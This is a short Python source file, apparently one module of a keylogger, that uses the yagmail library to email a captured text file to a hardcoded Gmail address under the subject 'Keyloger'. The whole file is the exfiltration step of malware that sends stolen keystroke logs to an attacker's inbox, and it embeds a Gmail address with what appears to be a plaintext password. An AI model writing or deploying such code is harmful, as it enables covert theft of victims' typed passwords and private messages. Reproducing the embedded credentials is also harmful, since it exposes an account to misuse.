#pip install yagmail
import yagmail

def enviar(archivoTXT):

    correo = yagmail.SMTP('hitomivallolet@gmail.com', 'CristhianChopolis2315')
    correo.send(to="hitomivallolet@gmail.com", subject="Keyloger", contents=[archivoTXT])


